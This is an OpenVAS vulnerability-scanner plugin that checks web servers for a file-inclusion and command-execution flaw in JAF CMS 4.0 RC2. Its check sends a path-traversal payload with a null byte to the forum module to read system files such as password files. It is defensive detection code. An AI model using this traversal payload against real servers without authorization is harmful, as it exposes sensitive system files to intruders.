###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jaf_44664.nasl 14 2013-10-27 12:33:37Z jan $
#
# JAF CMS Multiple Remote File Include and Remote Shell Command Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "JAF CMS is prone to an shell-command-execution vulnerability and
multiple remote file-include vulnerabilities because the application
fails to properly sanitize user-supplied input.

An attacker can exploit the remote shell-command-execution issue
to execute arbitrary shell commands in the context of the
webserver process.

An attacker can exploit remote file-include issues to include
arbitrary remote files containing malicious PHP code and execute it in
the context of the webserver process. This may allow the attacker to
compromise the application and the underlying system; other attacks
are also possible.

JAF CMS 4.0 RC2 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100895);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-05 13:21:25 +0100 (Fri, 05 Nov 2010)");
 script_bugtraq_id(44664);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_name("JAF CMS Multiple Remote File Include and Remote Shell Command Execution Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44664");
 script_xref(name : "URL" , value : "http://jaf-cms.sourceforge.net/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/514625");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/514626");
 script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/rfi_in_jaf_cms.html");
 script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/shell_create__command_execution_in_jaf_cms.html");

 script_description(desc);
 script_summary("Determine if installed JAF CMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/jaf","/cms",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/module/forum/main.php?website=",crap(data:"../",length:3*9),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_hole(port:port);
      exit(0);

    }
  }
}
exit(0);
